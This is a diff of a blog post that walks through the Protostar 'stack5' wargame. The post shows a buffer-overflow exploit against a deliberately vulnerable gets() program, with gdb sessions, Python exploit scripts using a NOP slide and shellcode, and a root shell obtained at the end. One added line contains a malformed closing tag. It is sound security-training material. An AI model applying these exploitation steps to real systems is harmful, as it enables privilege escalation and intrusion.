@@ -1,6 +1,8 @@
 ---
+layout: post
 title: Protostar Writeup - stack5
 updated: 2018-08-07 15:30
+tags: [tech, ctf, protostar, binary exploit]
 ---
 
 ## Protostar - stack5
@@ -10,7 +12,7 @@ Shellcode is nothing but a sequence of bytes, which when executed does some task
 This is true for older machines, however newer ones mitigate this vulnerability my making the stack non executable. We don't have to worry much about that.
 So here's the code.
 
-```c
+{% highlight c %}
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
@@ -21,12 +23,12 @@ int main(int argc, char **argv)
     char buffer[64];
     gets(buffer);
 }
-```
+{% endhighlight %}
 
 Nothing useful overhere, except the fact that we have an exploitable `gets()` function. So our choice of attack is a buffer overflow. We know from the previous post, that we can overflow into the EIP. Thus controlling the codeflow.
 Once we can do that, it's just a matter of redirecting control to our 'injected' shell code. First things first. Let's get the offset of the EIP. I'm using pwntools to generate the offset string.
 
-```shell
+{% highlight shell %}
 (gdb) set disassembly-flavor intel
 (gdb) disass main
 Dump of assembler code for function main:
@@ -54,12 +56,12 @@ Continuing.
 
 Program received signal SIGSEGV, Segmentation fault.
 0x61616174 in ?? ()
-```
+{% endhighlight %}
 
-Finding `0x61616174` in the offset string we find the location of the EIP at 76 bytes. So our address to our shellcode goes after 76 bytes of padding.
+Finding "0x61616174" in the offset string we find the location of the EIP at 76 bytes. So our address to our shellcode goes after 76 bytes of padding.
 Before we proceed let's take a look at the stack and figure out where to place our shell code.
 
-```shell
+{% highlight shell %}
 $ python -c "print 'A' * 76 + 'ABCD'" > /tmp/exploit
 $ gdb stack5
 (gdb) break *0x080483d9
@@ -82,11 +84,11 @@ Program received signal SIGSEGV, Segmentation fault.
 0xbffff7e0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
 0xbffff7f0:	0xbffff828	0x87ea710a	0xadbd671a	0x00000000
 0xbffff800:	0x00000000	0x00000000	0x00000001	0x08048310
-```
+{% endhighlight %}
 We can probably choose anyone of these addresses, let's try the first one `0xbffff7b0`.
 Below is the exploit script code.
 
-```python
+{% highlight python %}
 import struct
 
 offset = 'A' * 76
@@ -97,18 +99,18 @@ def go():
     print offset + address + shellcode
 
 go()
-```
+{% endhighlight %}
 
 Now let's run this and see what happens.
 
-```shell
+{% highlight shell %}
 $ python /tmp/exploit.py | ./stack5
-```
+{% endhighlight %}
 
 Oh oh!. Something's not right, we're getting an illegal instruction error. Let's take a look at it in the debugger.
 We find something even more funny here, it works perfectly fine in the debugger.
 
-```shell
+{% highlight shell %}
 $ python /tmp/exploit.py > /tmp/exploit
 $ gdb stack5
 (gdb) set disassembly-flavor intel
@@ -137,7 +139,7 @@ Continuing.
 Executing new program: /bin/dash
 
 Program exited normally.
-```
+{% endhighlight %}
 
 This actually bugged me for quite some time. I found a solution to this in the reddit thread [here](https://www.reddit.com/r/LiveOverflow/comments/8pr5ox/problem_on_protostar_stack5/).
 What happens is that when you execute a program, the OS even pushes the environment variables onto the stack.
@@ -149,7 +151,7 @@ There is a little trick to choosing this arbitrary address and length of NOP sli
 This is what is happening to us outside gdb, our shellcode is getting misaligned, so let's fix it.
 The below exploit is with a little trial and error, but you should get the idea.
 
-```python
+{% highlight python %}
 import struct
 
 offset = 'A' * 76
@@ -161,14 +163,14 @@ def go():
 	print offset + address + nopslide + shellcode
 
 go()
-```
+{% end highlight %}
 
 Let's run it:
 
-```shell
+{% highlight shell %}
 $ python /tmp/exploit.py | ./stack5
 $
-```
+{% endhighlight %}
 
 Ok, so no error this time. This begs the question, how do we use the shell, since it exits as soon as it is created.
 The reason is that as the input stream closes the shell also exits. So we need a way to hold the input stream.
@@ -176,13 +178,13 @@ After digging around a little I came across this stackoverflow [post](https://re
 
 So using one of those techniques...
 
-```shell
+{% highlight shell %}
 $ (python /tmp/exploit.py; cat) | ./stack5
 id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 whoami
 root
-```
+{% endhighlight %}
 
 Owned! We finally managed to get a shell with root privilages. I hope this gives you a taste of privilage escalation. This was by far the most fun exercise I've done. Hope you enjoyed this too :)
 
